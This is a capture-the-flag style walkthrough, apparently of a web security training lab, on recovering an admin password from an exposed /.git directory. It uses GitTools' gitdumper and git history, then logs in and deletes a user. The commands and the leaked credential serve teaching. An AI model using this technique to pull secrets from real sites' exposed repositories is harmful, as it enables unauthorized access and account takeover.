# Information disclosure in version control history

  

This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the `administrator` user then log in and delete the user `carlos`.

  

## Solution

  

We found that `/.git`  directory is accessible over thr browser and can able to browse the files inside those directory 

  

![](../Files/image.png)  

  

With the help of the following tools like [GitTools](https://github.com/internetwache/GitTools "https://github.com/internetwache/GitTools") where we can do deep mining into the `/.git`  directory 

  

```
git clone https://github.com/internetwache/GitTools

Cloning into 'GitTools'...
remote: Enumerating objects: 242, done.
remote: Counting objects: 100% (33/33), done.
remote: Compressing objects: 100% (23/23), done.
remote: Total 242 (delta 9), reused 27 (delta 7), pack-reused 209
Receiving objects: 100% (242/242), 56.46 KiB | 1.34 MiB/s, done.
Resolving deltas: 100% (88/88), done.
```

  

Now using `gitdumper`  we can dump those files 

  

```
./gitdumper.sh https://0af100170449d7ee81f725ea00760019.web-security-academy.net/.git/ ./output

[*] Destination folder does not exist
[+] Creating ./output/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/59/a11a147bc60e9c657255fe255c8dc59a396571
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/69/c1f3419d19725877d2116b27803eeda2f5770d
[+] Downloaded: objects/21/54555944002791a4d27412bf6e9a6f29e942fa
[+] Downloaded: objects/f1/0406cbf20c7394b26ab6527ff3b7847e9fb006
[+] Downloaded: objects/21/d23f13ce6c704b81857379a3e247e3436f4b26
[+] Downloaded: objects/89/44e3b9853691431dc58d5f4978d3940cea4af2
[+] Downloaded: objects/c6/dce6e78af021c0356d07915b04ae09eff9e3f1
```

  

Checking logs using `git log`  command shows there are two logs exists 

  

```sh
commit 59a11a147bc60e9c657255fe255c8dc59a396571 (HEAD -> master)
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Tue Jun 23 14:05:07 2020 +0000

    Remove admin password from config

commit 69c1f3419d19725877d2116b27803eeda2f5770d
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Mon Jun 22 16:23:42 2020 +0000

    Add skeleton admin panel
```

  

Our goal is to get the admin password for that reason I’m picking up this commit hash **59a11a147bc60e9c657255fe255c8dc59a396571** and with the following command `git show <commit hash>` 

  

```sh
commit 59a11a147bc60e9c657255fe255c8dc59a396571 (HEAD -> master)
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Tue Jun 23 14:05:07 2020 +0000

    Remove admin password from config

diff --git a/admin.conf b/admin.conf
index c6dce6e..21d23f1 100644
--- a/admin.conf
+++ b/admin.conf
@@ -1 +1 @@
-ADMIN_PASSWORD=gsgt65n8qqttokocbunz
+ADMIN_PASSWORD=env('ADMIN_PASSWORD')
```

  

Now with the admin password we have, we will go to our login page with the username as **administrator** and password as **gsgt65n8qqttokocbunz...** Delete the carlos to complete the lab 

  

![](../Files/image%202.png)